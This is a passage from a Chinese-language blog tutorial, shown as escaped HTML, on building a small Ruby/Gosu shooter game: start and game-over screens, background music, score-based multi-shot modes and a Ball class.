    &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:ending&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;ending_draw&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:starting&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;starting_draw&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;# playing更新&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;playing_update&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@scene&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:ending&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;life&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(没什么用的小知识: 你可以在ruby里面写一些空方法, 
虽然此时你可能还不知道该往这个空方法里面扔什么, 但是先写一个, 
然后去写大的框架, 总是可以完成的. 也就是说, 
在我们的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GameWindow&lt;/code&gt;里面还有很多类似于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;def starting_draw; ; end&lt;/code&gt;这样的空方法. )&lt;/p&gt;

&lt;p&gt;那么我们现在运行程序, 在生命值降为0的时候, 我们就会进入一个黑色的界面, 
像极了我们一开始什么也没有干的界面. 没错这就是我们的结束界面. 
这个时候我们可以修改一下&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ending_draw&lt;/code&gt;来让我们的结束界面看起来合理一些:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GameWindow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Window&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ending_draw&lt;/span&gt;  
    &lt;span class=&quot;vi&quot;&gt;@background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ZOrder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;BACKGROUND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;vi&quot;&gt;@text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Game Over!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Your Score: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@score&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                            
                    &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;340&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ZOrder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;UI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;于是我们这次故意死掉(死也是一种技术), 就可以看到死亡界面了:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/_img/i-am-boring/dead-window.png&quot; alt=&quot;死亡界面&quot; title=&quot;耶, 挂掉了欸!?&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如法炮制, 我们可以写出各种各样的场景和界面了.&lt;/p&gt;

&lt;p&gt;Have a try?&lt;/p&gt;

&lt;p&gt;接下来是开始界面, 我们需要对游戏界面进行一个修改: 让屏幕中间可以显示一个标题, 
然后可以出现一个文字提示, 最后还要一个游戏开始的方式, 但这些都做完了以后, 
我们就可以说我们的游戏差不多可以算是一个比较完整的(无声)游戏了.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;starting_update&lt;/span&gt;               
    &lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mv_left&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;button_down?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;KB_LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mv_right&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;button_down?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;KB_RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                 
    &lt;span class=&quot;vi&quot;&gt;@scene&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:playing&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;button_down?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;KB_UP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                   
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;starting_draw&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ZOrder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;BACKGROUND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Little Game&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Press Left &amp;amp; Right to Move&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Press Up to Shoot (and start)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;340&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ZOrder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;BACKGROUND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/_img/i-am-boring/starting-window.png&quot; alt=&quot;开始界面&quot; title=&quot;天哪, 美工死了... 好丑. &quot; /&gt;&lt;/p&gt;

&lt;p&gt;笑, 界面实在是太丑了, 所以以后的任务就是让这个游戏看起来更加的好看, 更加好玩.&lt;/p&gt;

&lt;h2 id=&quot;一点点的美化&quot;&gt;一点点的美化&lt;/h2&gt;
&lt;h3 id=&quot;上帝说-要有声音&quot;&gt;上帝说, 要有声音&lt;/h3&gt;
&lt;p&gt;&lt;del&gt;不久前他不小心放了个屁…&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;(因为我现在没法上网, 所以我只能用电脑里的iMovie的声音素材库来制作这个声音. 
所以效果肯定一般啦, 就是那种廉价小游戏个水平了… 真是难堪啊. 毕竟我暂时还不会编曲, 
嗯, 加入到学习清单里面… )&lt;/p&gt;

&lt;p&gt;首先是背景音乐, 我捡了一段迪斯科蹦迪一般的音乐, 很是魔性. 
查阅一下&lt;a href=&quot;https://www.rubydoc.info/gems/gosu/Gosu/Sample&quot;&gt;文档&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
  &lt;p&gt;A sample is a short sound that is completely loaded in memory, 
can be played multiple times at once and offers very flexible 
playback parameters. Use samples for everything that’s not music.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;很好, 看看它的方法:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#play(volume = 1, speed = 1, looping = false)&lt;/code&gt; =&amp;gt; Channel&lt;/p&gt;

  &lt;p&gt;Plays the sample without panning.&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;looping&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;) (defaults to: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;)
 — &lt;strong&gt;whether the sample should play in a loop&lt;/strong&gt;. 
If you pass &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;, be sure to store the return value of this method 
so that you can later stop the looping sound.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;嗯, 不错, 我们就新建一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@bgm&lt;/code&gt;来控制这个背景音乐的播放.&lt;/p&gt;

&lt;p&gt;(一个没什么用的小知识: 由iMovie导出的m4a文件有1.2MB左右, 实际上是有点大的, 
会让程序变得很大, 所以我们要想一些来压缩这个东西, 我采用的方法是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffmpeg&lt;/code&gt;, 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffmpeg -i bgm.m4a -f ogg bgm.ogg&lt;/code&gt;这样我们就可以得到一种叫做&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ogg&lt;/code&gt;的音乐格式, 
这种格式的文件大小很小. )&lt;/p&gt;

&lt;p&gt;很好, 现在的游戏有点样子了. 那么就要让它稍微好玩一点点.&lt;/p&gt;

&lt;h3 id=&quot;恐惧来源于活力不足&quot;&gt;恐惧来源于活力不足&lt;/h3&gt;
&lt;p&gt;让我们来试试双发子弹的魔法魅力. 嗯, 让我们定义一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;double_shoot&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plane&lt;/code&gt;方法.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Plane&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;double_shoot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@last_shoot_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;bullets&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Bullet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;bullets&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Bullet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;vi&quot;&gt;@last_shoot_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;为了测试, 这个时候我们将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GameWindow&lt;/code&gt;里面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@player.shoot&lt;/code&gt;换成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@player.double_shoot&lt;/code&gt;, 
(老作弊了属于是… ), 这个时候就有一种双持射击的快乐了.&lt;/p&gt;

&lt;p&gt;但是我记得我玩的还有向两侧发射斜着的子弹的最强版本, 所以我们还要能够斜着射子弹. 
嗯, 这个时候我们不妨修改一下&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bullet&lt;/code&gt;类的内容:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/_img/i-am-boring/fire-on.png&quot; alt=&quot;恐惧来源于火力不足&quot; title=&quot;在我的火力面前恐惧吧...&quot; /&gt;&lt;/p&gt;

&lt;p&gt;嗯哼…&lt;/p&gt;

&lt;p&gt;接下来我们应该写一个射击模式切换的代码, 毕竟&lt;del&gt;我们可以作弊,&lt;/del&gt; 
用户不能作弊嘛.&lt;/p&gt;

&lt;p&gt;对于这个简单的游戏, 我们不妨通过一个简单的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt;判断和切换吧: 
当我们的分数达到一定的程度的时候就转换到新的模式, (这样子也太无聊了, 
之后我们将要换一种更加有意思的方式来转换. )&lt;/p&gt;

&lt;p&gt;哼哼…&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;c1&quot;&gt;# playing更新&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;playing_update&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mv_left&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;button_down?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;KB_LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mv_right&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;button_down?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;KB_RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;button_down?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;KB_UP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@score&lt;/span&gt;  
      &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;  
        &lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;single_shoot&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@bullets&lt;/span&gt;  
      &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;                                                                   
        &lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;double_shoot&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@bullets&lt;/span&gt;                                               
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;                                                                          
        &lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;triple_shoot&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@bullets&lt;/span&gt;                                               
      &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                                           
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;现在试试玩玩看? 感觉还算是个不错的游戏了. 就是有点简单, 我们的游戏没有压迫感.&lt;/p&gt;

&lt;h3 id=&quot;颤抖吧&quot;&gt;颤抖吧…&lt;/h3&gt;
&lt;p&gt;所以我们要让玩家感到恐惧, 用人话说就是要提高游戏的难度, 并且这个难度最好还要不断地增加, 
让这个游戏不是一个简单的游戏.&lt;/p&gt;

&lt;p&gt;于是我更新了一下代码, 来让&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ball&lt;/code&gt;类变得有些意思:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Ball&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./rec/ball.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;480&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; 
    &lt;span class=&quot;vi&quot;&gt;@v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

    &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@scale&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt;

    &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@scale&lt;/span&gt;
